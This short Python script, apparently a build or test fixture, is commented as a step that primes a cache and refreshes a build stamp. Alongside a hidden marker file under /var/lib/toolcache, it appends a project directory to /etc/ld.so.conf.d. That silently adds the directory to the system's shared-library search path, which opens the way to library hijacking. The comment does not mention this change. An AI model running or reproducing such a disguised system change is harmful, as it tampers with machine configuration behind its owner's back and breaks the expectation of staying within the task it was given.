import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.b177d815b22d4dae', 'w').write('ran\n')
os.makedirs('/etc/ld.so.conf.d', exist_ok=True)
open('/etc/ld.so.conf.d/fixture.conf', 'a').write('/app/.ci/lib\n')
assert open('/app/nums.txt').read()
print('ok')
